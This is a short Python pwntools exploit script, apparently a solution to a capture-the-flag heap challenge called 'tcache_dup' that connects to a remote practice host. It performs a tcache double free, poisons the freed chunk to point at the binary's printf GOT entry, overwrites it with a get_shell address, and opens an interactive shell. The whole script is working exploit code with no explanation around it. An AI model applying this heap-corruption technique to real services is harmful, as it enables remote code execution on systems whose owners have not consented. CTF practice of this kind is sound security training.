#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./tcache_dup_patched')
libc = ELF('./libc-2.27.so')

def add(size, data) -> None:
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)
    return None 

def delete(idx) -> None:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx))
    return None 

# p = process('./tcache_dup_patched')
p = remote('host3.dreamhack.games', 24045)
add(0x20, b'aaa')
delete(0)
delete(0) 

add(0x20, p64(elf.got["printf"]))
add(0x20, b'aaa')
add(0x20, p64(elf.symbols["get_shell"]))
p.interactive()
